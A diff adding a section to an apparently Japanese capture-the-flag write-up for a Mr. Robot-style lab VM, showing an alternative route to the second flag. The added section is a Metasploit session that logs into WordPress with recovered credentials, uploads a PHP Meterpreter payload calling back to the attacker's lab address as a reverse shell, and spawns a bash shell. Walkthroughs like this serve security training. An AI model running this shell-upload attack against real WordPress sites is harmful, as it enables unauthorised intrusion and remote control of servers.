@@ -428,3 +428,93 @@ find / -name key-3-of-3.txt
 cat /root/key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
 ```
+
+## FLAG.2 別解：Metasploitを使ってShellを取る
+```
+root@kali:~# msfconsole -q
+msf5 > search wordpress
+                                                                                                                                                        
+Matching Modules                                                                                                                                        
+================                                                                                                                                        
+                                                                                                                                                        
+   #   Name                                                           Disclosure Date  Rank       Check  Description                                    
+   -   ----                                                           ---------------  ----       -----  -----------                                    
+   43  exploit/unix/webapp/wp_admin_shell_upload                      2015-02-21       excellent  Yes    WordPress Admin Shell Upload
+   44  exploit/unix/webapp/wp_advanced_custom_fields_exec             2012-11-14       excellent  Yes    WordPress Plugin Advanced Custom Fields Remote File Inclusion
+   45  exploit/unix/webapp/wp_ajax_load_more_file_upload              2015-10-10       excellent  Yes    Wordpress Ajax Load More PHP Upload Vulnerability
+
+msf5 > use 43
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > show options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   ER28-0652        yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.188.128  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /wp-login.php    yes       The base path to the wordpress application
+   USERNAME   elliot           yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.188.130  yes       The listen address (an interface may be specified)
+   LPORT  4848             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.188.128
+RHOST => 192.168.188.128
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RPORT 80
+RPORT => 80
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /
+TARGETURI => wp-login.php
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME elliot
+USERNAME => elliot
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD ER28-0652
+PASSWORD => ER28-0652
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false
+WPCHECK => false
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
+
+[*] Started reverse TCP handler on 192.168.188.130:4444
+[*] Authenticating with WordPress using elliot:ER28-0652...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wp-content/plugins/aKcqIWOOJn/yPnAsZCWMw.php...
+[*] Sending stage (38288 bytes) to 192.168.188.128
+[*] Meterpreter session 1 opened (192.168.188.130:4848 -> 192.168.188.128:33614) at 2020-11-28 16:48:39 +0900
+[!] This exploit may require manual cleanup of 'yPnAsZCWMw.php' on the target
+[!] This exploit may require manual cleanup of 'aKcqIWOOJn.php' on the target
+[!] This exploit may require manual cleanup of '../aKcqIWOOJn' on the target
+
+meterpreter >  python -c 'import pty; pty.spawn("/bin/bash")'
+[-] Unknown command: python.
+meterpreter > whoami
+[-] Unknown command: whoami.
+meterpreter > ls
+Listing: /opt/bitnami/apps/wordpress/htdocs/wp-content/plugins/aKcqIWOOJn
+=========================================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  138   fil   2020-11-28 16:48:22 +0900  aKcqIWOOJn.php
+100644/rw-r--r--  1116  fil   2020-11-28 16:48:22 +0900  yPnAsZCWMw.php
+
+meterpreter > shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+<ps/wordpress/htdocs/wp-content/plugins/aKcqIWOOJn$ cd /
+daemon@linux:/$ 
+```
+
